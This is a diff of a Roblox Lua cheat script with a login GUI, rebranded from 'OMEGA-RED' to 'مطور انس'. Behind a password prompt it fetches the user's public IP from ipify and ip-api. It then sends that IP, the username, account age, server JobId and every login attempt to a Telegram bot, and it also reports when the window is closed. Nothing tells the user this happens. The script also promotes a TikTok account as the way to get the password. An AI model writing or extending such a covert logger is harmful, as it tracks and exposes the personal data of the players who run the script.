@@ -1,11 +1,10 @@
--- OMEGA-RED // LOGIN SYSTEM + DROP MODE + TELEGRAM LOGGER
+-- مطور انس // LOGIN SYSTEM + DROP MODE + TELEGRAM LOGGER
 
 local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
 local PlayerGui = LP:WaitForChild("PlayerGui")
 local RunService = game:GetService("RunService")
 local Mouse = LP:GetMouse()
-local Workspace = game:GetService("Workspace")
 local UserInputService = game:GetService("UserInputService")
 local HttpService = game:GetService("HttpService")
 
@@ -19,7 +18,6 @@ local CHAT_ID = "6857630813"
 -- ========== دالة جلب الـ IP ==========
 local function GetIP()
     local ip = ""
-    -- طريقة 1
     local ok, res = pcall(function()
         return game:HttpGet("https://api.ipify.org?format=json")
     end)
@@ -27,7 +25,6 @@ local function GetIP()
         local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
         if ok2 and data and data.ip then ip = data.ip end
     end
-    -- طريقة 2
     if ip == "" then
         local ok, res = pcall(function()
             return game:HttpGet("http://ip-api.com/json/")
@@ -35,16 +32,6 @@ local function GetIP()
         if ok and res and res ~= "" then
             local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
             if ok2 and data and data.query then ip = data.query end
-        end
-    end
-    -- طريقة 3
-    if ip == "" then
-        local ok, res = pcall(function()
-            return game:HttpGet("https://httpbin.org/ip")
-        end)
-        if ok and res and res ~= "" then
-            local ok2, data = pcall(function() return HttpService:JSONDecode(res) end)
-            if ok2 and data and data.origin then ip = data.origin end
         end
     end
     if ip == "" then ip = "فشل الجلب" end
@@ -59,9 +46,12 @@ local function SendToTelegram(enteredName, ip, status)
     local accountAge = LP.AccountAge
     local gameJobId = game.JobId ~= "" and game.JobId or "N/A"
     local placeId = game.PlaceId
-    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
+    local gameName = "Unknown"
+    pcall(function()
+        gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    end)
 
-    local msg = "🎯 **دخول جديد إلى OMEGA-RED**\n\n" ..
+    local msg = "🎯 **دخول جديد - مطور انس**\n\n" ..
         "👤 **الاسم المُدخل:** `" .. tostring(enteredName) .. "`\n" ..
         "🎮 **اسم اللاعب:** " .. playerDisplay .. "\n" ..
         "🆔 **اليوزر:** `" .. playerName .. "`\n" ..
@@ -74,7 +64,6 @@ local function SendToTelegram(enteredName, ip, status)
         "✅ **الحالة:** " .. tostring(status) .. "\n" ..
         "⏰ **التوقيت:** " .. os.date("%Y-%m-%d %H:%M:%S")
 
-    -- إرسال عبر POST
     pcall(function()
         HttpService:RequestAsync({
             Url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage",
@@ -88,7 +77,6 @@ local function SendToTelegram(enteredName, ip, status)
         })
     end)
 
-    -- إرسال عبر GET (احتياطي)
     pcall(function()
         local encoded = HttpService:UrlEncode(msg)
         game:HttpGet("https://api.telegram.org/bot" .. BOT_TOKEN ..
@@ -114,8 +102,8 @@ bg.BorderSizePixel = 0
 bg.Parent = loginGui
 
 local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 350, 0, 330)
-mainFrame.Position = UDim2.new(0.5, -175, 0.5, -165)
+mainFrame.Size = UDim2.new(0, 350, 0, 450)
+mainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
 mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
 mainFrame.BackgroundTransparency = 0.05
 mainFrame.BorderSizePixel = 0
@@ -124,7 +112,6 @@ corner.CornerRadius = UDim.new(0, 15)
 corner.Parent = mainFrame
 mainFrame.Parent = loginGui
 
--- تأثير قوس قزح
 spawn(function()
     while loginGui and loginGui.Parent do
         local hue = tick() % 2 / 2
@@ -146,15 +133,51 @@ topCorner.Parent = topBar
 topBar.Parent = mainFrame
 
 local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -20, 1, 0)
+title.Size = UDim2.new(1, -50, 1, 0)
 title.Position = UDim2.new(0, 10, 0, 0)
-title.Text = "🔐 تسجيل الدخول - OMEGA RED"
+title.Text = "🔐 تسجيل الدخول - مطور انس"
 title.TextScaled = true
 title.TextXAlignment = Enum.TextXAlignment.Center
 title.TextColor3 = Color3.fromRGB(0, 200, 255)
 title.BackgroundTransparency = 1
 title.Font = Enum.Font.GothamBold
 title.Parent = topBar
+
+-- ✖ زر الإغلاق فوق يمين
+local closeLoginBtn = Instance.new("TextButton")
+closeLoginBtn.Size = UDim2.new(0, 28, 0, 28)
+closeLoginBtn.Position = UDim2.new(1, -33, 0, 3)
+closeLoginBtn.Text = "✖"
+closeLoginBtn.TextScaled = true
+closeLoginBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
+closeLoginBtn.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
+closeLoginBtn.BackgroundTransparency = 0.3
+closeLoginBtn.Font = Enum.Font.GothamBold
+closeLoginBtn.BorderSizePixel = 0
+local closeLoginCorner = Instance.new("UICorner")
+closeLoginCorner.CornerRadius = UDim.new(0, 6)
+closeLoginCorner.Parent = closeLoginBtn
+closeLoginBtn.Parent = topBar
+
+closeLoginBtn.MouseEnter:Connect(function()
+    closeLoginBtn.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+    closeLoginBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+end)
+closeLoginBtn.MouseLeave:Connect(function()
+    closeLoginBtn.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
+    closeLoginBtn.TextColor3 = Color3.fromRGB(255, 100, 100)
+end)
+
+closeLoginBtn.MouseButton1Click:Connect(function()
+    loginGui:Destroy()
+    task.spawn(function()
+        pcall(function()
+            local ip = GetIP()
+            SendToTelegram("(المستخدم أغلق الواجهة)", ip, "⚠️ أغلق واجهة الدخول")
+        end)
+    end)
+    -- بدون طرد — الواجهة بس تنغلق
+end)
 
 -- عنوان فرعي
 local subtitle = Instance.new("TextLabel")
@@ -222,10 +245,57 @@ passCorner.CornerRadius = UDim.new(0, 8)
 passCorner.Parent = passBox
 passBox.Parent = mainFrame
 
+-- قسم التواصل والتيك توك
+local contactFrame = Instance.new("Frame")
+contactFrame.Size = UDim2.new(1, -40, 0, 90)
+contactFrame.Position = UDim2.new(0, 20, 0, 240)
+contactFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 40)
+contactFrame.BorderSizePixel = 0
+contactFrame.Parent = mainFrame
+local contactCorner = Instance.new("UICorner")
+contactCorner.CornerRadius = UDim.new(0, 8)
+contactCorner.Parent = contactFrame
+
+local contactText = Instance.new("TextLabel")
+contactText.Size = UDim2.new(1, -10, 0, 45)
+contactText.Position = UDim2.new(0, 5, 0, 3)
+contactText.Text = "(اذا متعرف كلمة المرور تواصل معي تيكتوك anas_anas_anas123)"
+contactText.TextScaled = true
+contactText.TextWrapped = true
+contactText.TextColor3 = Color3.fromRGB(255, 200, 100)
+contactText.BackgroundTransparency = 1
+contactText.Font = Enum.Font.GothamBold
+contactText.Parent = contactFrame
+
+local copyUserBtn = Instance.new("TextButton")
+copyUserBtn.Size = UDim2.new(0, 200, 0, 30)
+copyUserBtn.Position = UDim2.new(0.5, -100, 0, 52)
+copyUserBtn.Text = "📋 نسخ اليوزر"
+copyUserBtn.TextScaled = true
+copyUserBtn.BackgroundColor3 = Color3.fromRGB(80, 60, 140)
+copyUserBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyUserBtn.Font = Enum.Font.GothamBold
+copyUserBtn.BorderSizePixel = 0
+local copyUserCorner = Instance.new("UICorner")
+copyUserCorner.CornerRadius = UDim.new(0, 6)
+copyUserCorner.Parent = copyUserBtn
+copyUserBtn.Parent = contactFrame
+
+copyUserBtn.MouseButton1Click:Connect(function()
+    pcall(function() setclipboard("anas_anas_anas123") end)
+    local originalText = copyUserBtn.Text
+    local originalColor = copyUserBtn.BackgroundColor3
+    copyUserBtn.Text = "✅ تم النسخ!"
+    copyUserBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    task.wait(1.5)
+    copyUserBtn.Text = originalText
+    copyUserBtn.BackgroundColor3 = originalColor
+end)
+
 -- رسالة الحالة
 local statusLabel = Instance.new("TextLabel")
-statusLabel.Size = UDim2.new(1, -40, 0, 25)
-statusLabel.Position = UDim2.new(0, 20, 0, 240)
+statusLabel.Size = UDim2.new(1, -40, 0, 22)
+statusLabel.Position = UDim2.new(0, 20, 0, 338)
 statusLabel.Text = ""
 statusLabel.TextScaled = true
 statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
@@ -235,7 +305,7 @@ statusLabel.Parent = mainFrame
 -- زر الدخول
 local loginBtn = Instance.new("TextButton")
 loginBtn.Size = UDim2.new(1, -40, 0, 40)
-loginBtn.Position = UDim2.new(0, 20, 0, 270)
+loginBtn.Position = UDim2.new(0, 20, 0, 368)
 loginBtn.Text = "🚀 دخول"
 loginBtn.TextScaled = true
 loginBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
@@ -265,7 +335,6 @@ local function TryLogin()
     local nameText = nameBox.Text
     local passText = passBox.Text
 
-    -- التحقق من الاسم
     if nameText == "" or nameText:gsub("%s", "") == "" then
         statusLabel.Text = "❌ اكتب اسمك أولاً!"
         return
@@ -276,11 +345,8 @@ local function TryLogin()
         return
     end
 
-    -- التحقق من كلمة المرور
     if passText ~= PASSWORD then
         statusLabel.Text = "❌ كلمة المرور غلط!"
-
-        -- إرسال محاولة فاشلة للبوت
         task.spawn(function()
             local ip = GetIP()
             SendToTelegram(nameText .. " (محاولة فاشلة)", ip, "❌ كلمة مرور خاطئة")
@@ -288,7 +354,6 @@ local function TryLogin()
         return
     end
 
-    -- نجاح الدخول
     loginSuccess = true
     enteredPlayerName = nameText
     statusLabel.Text = "✅ تم الدخول بنجاح!"
@@ -296,25 +361,21 @@ local function TryLogin()
     loginBtn.Text = "✅ مرحباً " .. nameText
     loginBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
 
-    -- إرسال البيانات للبوت
     task.spawn(function()
         local ip = GetIP()
         SendToTelegram(nameText, ip, "✅ دخول ناجح")
     end)
 
-    -- إغلاق الواجهة بعد ثانيتين
     task.wait(2)
     loginGui:Destroy()
 
-    -- تشغيل السكربت الرئيسي
-    if _G.OmegaRedMain then
-        _G.OmegaRedMain()
+    if _G.AnasMain then
+        _G.AnasMain()
     end
 end
 
 loginBtn.MouseButton1Click:Connect(TryLogin)
 
--- الدخول بمفتاح Enter
 nameBox.FocusLost:Connect(function(enter)
     if enter then passBox:CaptureFocus() end
 end)
@@ -323,12 +384,10 @@ passBox.FocusLost:Connect(function(enter)
 end)
 
 -- ========== انتظار الدخول ==========
--- ما راح يكمل السكربت إلا بعد الدخول
 repeat task.wait(0.1) until loginSuccess
 
 -- ========== تشغيل السكربت الرئيسي ==========
-_G.OmegaRedMain = function()
-    -- القائمة الترحيبية
+_G.AnasMain = function()
     local welcomeGui = Instance.new("ScreenGui")
     welcomeGui.Name = "WelcomeScreen"
     welcomeGui.ResetOnSpawn = false
@@ -387,7 +446,7 @@ _G.OmegaRedMain = function()
     local scriptText = Instance.new("TextLabel")
     scriptText.Size = UDim2.new(0, 320, 0, 40)
     scriptText.Position = UDim2.new(0.5, -160, 0, 55)
-    scriptText.Text = "سكربت CV9"
+    scriptText.Text = "سكربت مطور انس"
     scriptText.TextScaled = true
     scriptText.TextColor3 = Color3.fromRGB(255, 100, 0)
     scriptText.BackgroundTransparency = 1
@@ -434,7 +493,7 @@ _G.OmegaRedMain = function()
     copyBtn.Parent = mainFrame2
 
     copyBtn.MouseButton1Click:Connect(function()
-        setclipboard("anas_anas_anas123")
+        pcall(function() setclipboard("anas_anas_anas123") end)
         local originalText = copyBtn.Text
         copyBtn.Text = "✅ تم النسخ!"
         copyBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
@@ -577,7 +636,7 @@ _G.OmegaRedMain = function()
 
     -- واجهة DROP MODE
     local gui = Instance.new("ScreenGui")
-    gui.Name = "OmegaDropGUI"
+    gui.Name = "AnasDropGUI"
     gui.ResetOnSpawn = false
     gui.Parent = PlayerGui
 
@@ -603,7 +662,7 @@ _G.OmegaRedMain = function()
 
     local dragText = Instance.new("TextLabel")
     dragText.Size = UDim2.new(1, 0, 1, 0)
-    dragText.Text = "OMEGA DROP"
+    dragText.Text = "مطور انس"
     dragText.TextScaled = true
     dragText.TextColor3 = Color3.fromRGB(255, 255, 255)
     dragText.BackgroundTransparency = 1
@@ -716,7 +775,8 @@ _G.OmegaRedMain = function()
         if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
             local delta = input.Position - dragStart
             dropFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end    end)
+        end
+    end)
 
     -- أحداث الأزرار
     cuffBtn.MouseButton1Click:Connect(function()
@@ -761,10 +821,10 @@ _G.OmegaRedMain = function()
         end
     end)
 
-    print("Omega Drop Mode Active")
+    print("✅ مطور انس - Drop Mode Active")
 end
 
 -- تشغيل السكربت الرئيسي بعد الدخول
 if loginSuccess then
-    _G.OmegaRedMain()
+    _G.AnasMain()
 end
